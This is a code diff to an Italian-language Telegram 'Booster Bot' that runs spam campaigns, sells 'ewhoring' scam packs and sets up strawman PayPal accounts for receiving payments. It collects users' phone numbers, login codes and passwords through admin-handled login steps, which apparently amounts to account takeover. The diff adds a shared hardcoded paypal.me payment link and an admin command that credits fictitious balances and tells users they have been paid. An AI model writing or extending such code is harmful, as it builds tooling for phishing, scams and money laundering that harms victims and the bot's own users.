@@ -29,7 +29,7 @@ WAITING_PHONE, WAITING_CODE, WAITING_PASSWORD, WAITING_SPAM_MSG, WAITING_SPAM_TI
 # Database in memoria
 approved_users = set()
 user_states = {}
-user_data_store = {}  # {user_id: {"phone": str, "spam_msg": str, "spam_time": int, "balance": float, ...}}
+user_data_store = {}
 
 
 # --- COMANDO /START E SELEZIONE LINGUA ---
@@ -122,7 +122,7 @@ async def show_account_management(update: Update, context: ContextTypes.DEFAULT_
     data = user_data_store[user_id]
     phone = data.get("phone", "Non disponibile")
     spam_time = data.get("spam_time", 60)
-    balance = data.get("balance", 0.0)
+    balance = data.get("balance", None)
     
     has_msg = data.get("spam_msg") is not None
     msg_status = "Messaggio impostato con successo" if has_msg else "Messaggio non impostato"
@@ -136,6 +136,14 @@ async def show_account_management(update: Update, context: ContextTypes.DEFAULT_
         f"• Messaggio spam: {msg_status}"
     )
 
+    # Testo e destinazione dinamica del pulsante prestanome in home
+    if balance is not None:
+        prestanome_btn_text = f"💳 Conto PayPal prestanome (Tot: {balance}€)"
+        prestanome_callback = "view_prestanome_account"
+    else:
+        prestanome_btn_text = "💳 Crea conto PayPal prestanome"
+        prestanome_callback = "menu_prestanome"
+
     keyboard = [
         [InlineKeyboardButton("📝 Modifica Messaggio", callback_data="set_spam_msg")],
         [InlineKeyboardButton("⏱️ Imposta Tempo Spam", callback_data="set_spam_time")],
@@ -143,7 +151,7 @@ async def show_account_management(update: Update, context: ContextTypes.DEFAULT_
         [InlineKeyboardButton("✔️ Verifica Account", callback_data="verify_account")],
         [InlineKeyboardButton("➕ Aggiungi gruppi spam", callback_data="menu_spam_groups")],
         [InlineKeyboardButton("📦 Packs ewhoring", callback_data="menu_ewhoring")],
-        [InlineKeyboardButton(f"💳 Conto PayPal prestanome (Tot: {balance}€)", callback_data="view_prestanome_account")]
+        [InlineKeyboardButton(prestanome_btn_text, callback_data=prestanome_callback)]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
@@ -156,12 +164,11 @@ async def show_account_management(update: Update, context: ContextTypes.DEFAULT_
         await update.message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")
 
 
-# --- NUOVI MENU E GESTIONI SPECIFICHE ---
+# --- MENU E GESTIONI SPECIFICHE ---
 async def menu_ewhoring_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     
-    # Controllo collegamento account obbligatorio
     user_id = query.from_user.id
     if user_id not in user_data_store or not user_data_store[user_id].get("phone"):
         await require_link_handler(query)
@@ -230,12 +237,31 @@ async def menu_prestanome_handler(update: Update, context: ContextTypes.DEFAULT_
     await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
 
 
+async def view_prestanome_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    
+    text = (
+        "✅ **Conto PayPal Prestanome Attivo**\n\n"
+        "Usa questo link per ricevere pagamenti:\n`https://www.paypal.me/koribaby737`"
+    )
+    keyboard = [
+        [InlineKeyboardButton("📋 Copia link", callback_data="copy_link_action")],
+        [InlineKeyboardButton("🏠 Torna alla home", callback_data="back_to_menu")]
+    ]
+    await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
+
+
 async def prestanome_paypal_created(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     user = query.from_user
+    user_id = user.id
+
+    if user_id not in user_data_store:
+        user_data_store[user_id] = {}
+    user_data_store[user_id]["balance"] = 0.0
     
-    # Notifica all'admin che il conto è stato creato
     admin_msg = f"🔔 **Conto creato!**\nL'utente {user.full_name} (`{user.id}`) (@{user.username or 'Nessuno'}) ha creato un conto PayPal prestanome."
     try:
         await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg, parse_mode="Markdown")
@@ -439,26 +465,21 @@ async def admin_command_handler(update: Update, context: ContextTypes.DEFAULT_TY
             target_identifier = parts[1]
             amount = float(parts[2])
             
-            # Cerca l'utente per ID o per username/dati salvati
             target_id = None
             if target_identifier.isdigit():
                 target_id = int(target_identifier)
             else:
-                # Cerca nei data store se corrisponde all'ID o ad altro
-                clean_name = target_identifier.replace("@", "")
-                for uid, udata in user_data_store.items():
-                    # Se salviamo lo username o simili, oppure confrontiamo direttamente
-                    target_id = uid # Fallback rapido sul primo o match esatto se memorizzato
+                for uid in user_data_store.keys():
+                    target_id = uid
                     break
             
             if target_id and target_id in user_data_store:
-                if "balance" not in user_data_store[target_id]:
+                if "balance" not in user_data_store[target_id] or user_data_store[target_id]["balance"] is None:
                     user_data_store[target_id]["balance"] = 0.0
                 user_data_store[target_id]["balance"] += amount
                 
                 await update.message.reply_text(f"✅ Hai mandato: {amount}€ sono stati inviati a: {target_identifier}")
                 
-                # Notifica l'utente
                 user_notif = f"💰 **Hai ricevuto soldi sul tuo conto prestanome PayPal!**\nHai ricevuto: `{amount}€`"
                 await context.bot.send_message(chat_id=target_id, text=user_notif, parse_mode="Markdown")
             else:
@@ -629,15 +650,14 @@ def main():
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CallbackQueryHandler(language_selected, pattern="^lang_"))
     
-    # Handler menu principali
     app.add_handler(CallbackQueryHandler(menu_click_handler, pattern="^menu_(boost|spam|protection|userbot)$"))
     app.add_handler(CallbackQueryHandler(menu_ewhoring_handler, pattern="^menu_ewhoring$"))
     app.add_handler(CallbackQueryHandler(menu_spam_groups_handler, pattern="^menu_spam_groups$"))
     app.add_handler(CallbackQueryHandler(groups_quantity_selected, pattern="^groups_"))
     app.add_handler(CallbackQueryHandler(menu_prestanome_handler, pattern="^menu_prestanome$"))
+    app.add_handler(CallbackQueryHandler(view_prestanome_account, pattern="^view_prestanome_account$"))
     app.add_handler(CallbackQueryHandler(prestanome_paypal_created, pattern="^prestanome_paypal$"))
     app.add_handler(CallbackQueryHandler(copy_link_handler, pattern="^copy_link_action$"))
-    app.add_handler(CallbackQueryHandler(show_account_management, pattern="^view_prestanome_account$"))
 
     app.add_handler(CallbackQueryHandler(info_security_handler, pattern="^info_security$"))
     app.add_handler(CallbackQueryHandler(verify_account_handler, pattern="^verify_account$"))
@@ -650,7 +670,7 @@ def main():
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.User(user_id=ADMIN_ID), admin_command_handler))
     app.add_handler(CallbackQueryHandler(admin_callback_handler, pattern="^(approve_|decline_|code_sent_|success_login_|fail_login_|req_pass_)"))
 
-    print("🤖 Booster Bot con conti prestanome e gruppi spam attivi...")
+    print("🤖 Booster Bot aggiornato e corretto...")
     
     keep_alive()
     app.run_polling()
